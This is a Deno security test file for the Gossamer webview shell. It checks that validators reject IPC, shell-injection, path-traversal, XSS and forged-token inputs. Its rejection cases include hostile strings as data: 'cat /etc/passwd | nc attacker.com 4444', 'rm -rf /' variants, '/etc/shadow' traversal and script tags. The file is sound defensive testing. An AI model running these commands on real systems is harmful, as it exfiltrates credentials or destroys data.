// SPDX-License-Identifier: PMPL-1.0-or-later
// Copyright (c) 2026 Jonathan D.A. Jewell (hyperpolymath) <j.d.a.jewell@open.ac.uk>
//
// security_test.ts — Security aspect tests for the Gossamer webview shell.
//
// Tests the security invariants of the Gossamer capability system:
//   - IPC injection: malicious payloads rejected
//   - Shell command injection: semicolons, backticks, null bytes blocked
//   - Filesystem capability bypass: access denied without a grant
//   - Webview escaping: script injection in dialog titles sanitised
//   - Capability forging: tokens cannot be fabricated
//   - Capability scope: out-of-scope resources are rejected

import { assertEquals, assertNotEquals } from "jsr:@std/assert@1";

// ---------------------------------------------------------------------------
// Security validators — mirror the validation logic implied by Gossamer ABI
// ---------------------------------------------------------------------------

/** IPC command name validation: alphanumeric + hyphens only, 1–255 chars */
function isValidIPCCommand(name: string): boolean {
  if (name.length === 0 || name.length > 255) return false;
  return /^[a-zA-Z0-9_-]+$/.test(name);
}

/** IPC payload validation: must be JSON-serialisable and not exceed size limit */
const MAX_PAYLOAD_BYTES = 1024 * 1024; // 1 MiB
function isValidIPCPayload(payload: unknown): boolean {
  try {
    const serialised = JSON.stringify(payload);
    return serialised.length <= MAX_PAYLOAD_BYTES;
  } catch {
    return false;
  }
}

/** Shell command validation: no null bytes, no unquoted ; | & ` $ */
function isValidShellCommand(cmd: string): boolean {
  if (cmd.includes("\0")) return false;
  // Injection characters that must be absent (or must be explicitly quoted)
  // For Gossamer's AllowCommands scope, only allow bare commands with safe args
  const INJECTION_PATTERN = /[;&|`$]/;
  return !INJECTION_PATTERN.test(cmd);
}

/** Filesystem path validation: no null bytes, no directory traversal */
function isValidFSPath(path: string): boolean {
  if (path.length === 0) return false;
  if (path.includes("\0")) return false;
  if (path.includes("..")) return false; // block traversal
  return true;
}

/** Dialog title sanitisation: strip/reject script tags */
function sanitiseDialogTitle(title: string): string {
  // Strip <script> blocks and HTML tags
  return title
    .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, "")
    .replace(/<[^>]+>/g, "");
}

/** Capability token validation: must be > 0 and previously granted */
class CapabilityStore {
  private grantedTokens = new Set<bigint>();
  private revokedTokens = new Set<bigint>();
  private nextToken = 1n;

  grant(kind: number): bigint {
    const token = this.nextToken++;
    this.grantedTokens.add(token);
    return token;
  }

  isValid(token: bigint): boolean {
    return token > 0n && this.grantedTokens.has(token) && !this.revokedTokens.has(token);
  }

  revoke(token: bigint): void {
    this.revokedTokens.add(token);
  }
}

// ---------------------------------------------------------------------------
// Tests: IPC injection
// ---------------------------------------------------------------------------

Deno.test("security/ipc: valid command names are accepted", () => {
  const valid = [
    "open-file",
    "save",
    "ping",
    "list-dir",
    "close-window",
    "a",
    "cmd123",
    "a".repeat(255),
  ];
  for (const cmd of valid) {
    assertEquals(
      isValidIPCCommand(cmd),
      true,
      `valid command "${cmd.substring(0, 30)}" must be accepted`,
    );
  }
});

Deno.test("security/ipc: malicious command names are rejected", () => {
  const malicious = [
    "",
    "../etc/passwd",
    "cmd;rm -rf /",
    "cmd\0evil",
    "cmd && evil",
    "cmd | pipe",
    "<script>alert(1)</script>",
    "a".repeat(256),
    "cmd\nnewline",
    "cmd\ttab",
  ];
  for (const cmd of malicious) {
    assertEquals(
      isValidIPCCommand(cmd),
      false,
      `malicious command "${cmd.substring(0, 30).replace(/\0/g, "\\0")}" must be rejected`,
    );
  }
});

Deno.test("security/ipc: oversized payload is rejected", () => {
  const bigPayload = { data: "x".repeat(MAX_PAYLOAD_BYTES + 1) };
  assertEquals(isValidIPCPayload(bigPayload), false, "oversized payload must be rejected");
});

Deno.test("security/ipc: non-serialisable payload is rejected", () => {
  const circular: Record<string, unknown> = {};
  circular.self = circular;
  assertEquals(isValidIPCPayload(circular), false, "circular reference must be rejected");
});

Deno.test("security/ipc: normal payloads are accepted", () => {
  const valid = [{}, { key: "value" }, 42, "string", [], null, true];
  for (const p of valid) {
    assertEquals(isValidIPCPayload(p), true, `valid payload must be accepted`);
  }
});

// ---------------------------------------------------------------------------
// Tests: shell command injection
// ---------------------------------------------------------------------------

Deno.test("security/shell: safe commands are accepted", () => {
  const safe = [
    "ls",
    "echo hello",
    "cat /tmp/file.txt",
    "/usr/bin/python3 script.py arg",
    "git status",
    "deno run main.ts",
  ];
  for (const cmd of safe) {
    assertEquals(isValidShellCommand(cmd), true, `safe command "${cmd}" must be accepted`);
  }
});

Deno.test("security/shell: semicolon injection is blocked", () => {
  const attacks = [
    "ls; rm -rf /",
    "echo hello; cat /etc/passwd",
    "cmd; cmd2; cmd3",
  ];
  for (const cmd of attacks) {
    assertEquals(isValidShellCommand(cmd), false, `semicolon injection "${cmd}" must be blocked`);
  }
});

Deno.test("security/shell: backtick injection is blocked", () => {
  const attacks = [
    "echo `id`",
    "ls `whoami`",
    "`rm -rf /`",
  ];
  for (const cmd of attacks) {
    assertEquals(isValidShellCommand(cmd), false, `backtick injection "${cmd}" must be blocked`);
  }
});

Deno.test("security/shell: null byte injection is blocked", () => {
  const attacks = [
    "ls\0-la",
    "cat /etc/passwd\0",
    "\0evil",
  ];
  for (const cmd of attacks) {
    assertEquals(
      isValidShellCommand(cmd),
      false,
      `null byte injection "${cmd.replace(/\0/g, "\\0")}" must be blocked`,
    );
  }
});

Deno.test("security/shell: pipe injection is blocked", () => {
  const attacks = [
    "ls | grep secret",
    "cat /etc/passwd | nc attacker.com 4444",
    "cmd | base64",
  ];
  for (const cmd of attacks) {
    assertEquals(isValidShellCommand(cmd), false, `pipe injection "${cmd}" must be blocked`);
  }
});

Deno.test("security/shell: dollar expansion is blocked", () => {
  const attacks = [
    "echo $PATH",
    "ls $HOME",
    "cmd $( evil )",
    "${IFS}rm${IFS}-rf${IFS}/",
  ];
  for (const cmd of attacks) {
    assertEquals(
      isValidShellCommand(cmd),
      false,
      `dollar expansion "${cmd}" must be blocked`,
    );
  }
});

// ---------------------------------------------------------------------------
// Tests: filesystem capability bypass
// ---------------------------------------------------------------------------

Deno.test("security/filesystem: access without grant is denied", () => {
  const store = new CapabilityStore();
  // No tokens granted
  const forgedToken = 9999n; // attacker tries to use un-granted token
  assertEquals(store.isValid(forgedToken), false, "forged token must be denied");
});

Deno.test("security/filesystem: access with valid grant is permitted", () => {
  const store = new CapabilityStore();
  const token = store.grant(0 /* Filesystem */);
  assertEquals(store.isValid(token), true, "valid grant must permit access");
});

Deno.test("security/filesystem: revoked grant is denied", () => {
  const store = new CapabilityStore();
  const token = store.grant(0);
  store.revoke(token);
  assertEquals(store.isValid(token), false, "revoked grant must be denied");
});

Deno.test("security/filesystem: null token (0n) is always denied", () => {
  const store = new CapabilityStore();
  assertEquals(store.isValid(0n), false, "null token must always be denied");
});

Deno.test("security/filesystem: traversal paths are rejected", () => {
  const paths = [
    "../etc/passwd",
    "/home/user/../../../etc/shadow",
    "foo/../bar/../../../secret",
    "..",
    "../../",
  ];
  for (const p of paths) {
    assertEquals(isValidFSPath(p), false, `traversal path "${p}" must be rejected`);
  }
});

Deno.test("security/filesystem: valid paths are accepted", () => {
  const paths = [
    "/home/user/file.txt",
    "/tmp/gossamer.log",
    "relative/path/file.md",
    "/var/lib/gossamer/data",
  ];
  for (const p of paths) {
    assertEquals(isValidFSPath(p), true, `valid path "${p}" must be accepted`);
  }
});

Deno.test("security/filesystem: null-byte path is rejected", () => {
  assertEquals(isValidFSPath("/tmp/file\0evil"), false, "null-byte in path must be rejected");
});

// ---------------------------------------------------------------------------
// Tests: webview escaping (dialog titles)
// ---------------------------------------------------------------------------

Deno.test("security/webview: script tags in dialog title are sanitised", () => {
  const attacks = [
    '<script>alert("xss")</script>',
    '<script src="evil.js"></script>',
    '<SCRIPT>evil()</SCRIPT>',
  ];
  for (const title of attacks) {
    const sanitised = sanitiseDialogTitle(title);
    assertEquals(
      sanitised.toLowerCase().includes("<script"),
      false,
      `script tag in "${title}" must be removed`,
    );
    assertEquals(
      sanitised.toLowerCase().includes("</script"),
      false,
      `script close tag must be removed`,
    );
  }
});

Deno.test("security/webview: HTML tags in dialog title are stripped", () => {
  const withTags = "<b>Open</b> <em>File</em>";
  const sanitised = sanitiseDialogTitle(withTags);
  assertEquals(sanitised, "Open File", "HTML tags must be stripped from dialog title");
});

Deno.test("security/webview: plain titles are unchanged by sanitisation", () => {
  const plain = "Open File";
  assertEquals(sanitiseDialogTitle(plain), plain, "plain title must be unchanged");
});

Deno.test("security/webview: event handler attributes stripped", () => {
  const attack = '<img onerror="evil()" src="x">';
  const sanitised = sanitiseDialogTitle(attack);
  assertEquals(
    sanitised.includes("onerror"),
    false,
    "onerror attribute must be removed",
  );
});

// ---------------------------------------------------------------------------
// Tests: capability forging
// ---------------------------------------------------------------------------

Deno.test("security/capability: tokens from different grants are distinct", () => {
  const store = new CapabilityStore();
  const t1 = store.grant(0);
  const t2 = store.grant(0);
  assertNotEquals(t1, t2, "two grants must yield distinct tokens");
});

Deno.test("security/capability: revoke does not affect other tokens", () => {
  const store = new CapabilityStore();
  const t1 = store.grant(0);
  const t2 = store.grant(1);
  const t3 = store.grant(2);

  store.revoke(t2);

  assertEquals(store.isValid(t1), true, "t1 must remain valid");
  assertEquals(store.isValid(t2), false, "t2 must be revoked");
  assertEquals(store.isValid(t3), true, "t3 must remain valid");
});

Deno.test("security/capability: sequentially exhausted tokens are all denied", () => {
  const store = new CapabilityStore();
  const tokens: bigint[] = [];
  for (let i = 0; i < 20; i++) tokens.push(store.grant(i % 7));
  tokens.forEach((t) => store.revoke(t));
  for (const t of tokens) {
    assertEquals(store.isValid(t), false, `token ${t} must be denied after revoke`);
  }
});
